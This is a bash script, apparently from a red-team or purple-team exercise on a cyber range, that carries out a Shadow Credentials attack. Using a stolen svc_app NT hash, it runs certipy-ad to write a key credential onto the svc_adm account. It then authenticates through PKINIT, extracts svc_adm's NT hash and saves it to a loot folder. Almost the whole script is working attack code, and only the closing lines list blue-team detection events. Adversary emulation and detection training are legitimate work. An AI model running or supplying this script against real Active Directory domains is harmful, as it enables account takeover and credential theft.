#!/bin/bash
# ============================================================
# TTP4: Shadow Credentials — svc_app → svc_adm via PKINIT
# MITRE: T1556 — Modify Authentication Process
# MITRE: T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting (adjacent)
# APT28 Ref: Identity manipulation for persistent access
# ============================================================
# PURPOSE: Generates Event 5136 on DC01 (msDS-KeyCredentialLink
#          modification), Event 4768 with PKINIT pre-auth type.
# RUN FROM: Kali (attacker machine)
# PREREQ: svc_app NT hash from TTP3
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
DCIP="${1:?Usage: $0 <DC_IP> <SVC_APP_HASH>}"
SVC_APP_HASH="${2:?Usage: $0 <DC_IP> <SVC_APP_HASH>}"

echo "[*] TTP4: Shadow Credentials — T1556"
echo "[*] Target: svc_adm via svc_app WriteProperty on DC01"

# Sync clock
dc_time=$(nmap -p 445 --script smb2-time "$DCIP" 2>/dev/null | grep "date:" | grep -oP '\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}' | head -1)
[ -n "$dc_time" ] && sudo date -s "$dc_time" &>/dev/null && echo "[+] Clock synced: $dc_time"

cd "$TOOLS"

echo ""
echo "[*] Phase 1: Shadow Credentials auto — write key + PKINIT authenticate..."
echo "[*] This writes to svc_adm's msDS-KeyCredentialLink attribute on DC01"
echo ""

certipy-ad shadow auto \
    -u "svc_app@$DOMAIN" \
    -hashes ":$SVC_APP_HASH" \
    -account svc_adm \
    -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp4_shadow.txt"

# Check for PFX output
PFX_FILE=$(ls -t *.pfx 2>/dev/null | head -1)
SVC_ADM_HASH=""

if [ -n "$PFX_FILE" ]; then
    echo "[+] PFX generated: $PFX_FILE"
    echo ""
    echo "[*] Phase 2: PKINIT authentication with certificate..."
    certipy-ad auth -pfx "$PFX_FILE" -dc-ip "$DCIP" 2>&1 | tee "$LOOT/ttp4_pkinit.txt"
    SVC_ADM_HASH=$(grep -oP '[a-f0-9]{32}' "$LOOT/ttp4_pkinit.txt" | tail -1)
fi

# Fallback: check if shadow auto already returned the hash
[ -z "$SVC_ADM_HASH" ] && SVC_ADM_HASH=$(grep -oP '[a-f0-9]{32}' "$LOOT/ttp4_shadow.txt" | tail -1)

if [ -n "$SVC_ADM_HASH" ]; then
    echo "[+] svc_adm NT hash: $SVC_ADM_HASH"
    echo "$SVC_ADM_HASH" > "$LOOT/ttp4_svc_adm_hash.txt"
else
    echo "[-] Could not extract svc_adm hash."
    echo "[?] Enter svc_adm NT hash manually:"
    read -r SVC_ADM_HASH
    echo "$SVC_ADM_HASH" > "$LOOT/ttp4_svc_adm_hash.txt"
fi

echo ""
echo "[+] TTP4 Complete."
echo "[+] Blue team: check DC01 Security log for:"
echo "    - Event 5136 — msDS-KeyCredentialLink attribute modified on svc_adm"
echo "    - Event 4768 — TGT request for svc_adm with PKINIT pre-auth type"
echo "    - PKINIT 4768 for a user that never used certificate auth before = Shadow Credentials"
echo "[+] Artifacts: $LOOT/ttp4_*"
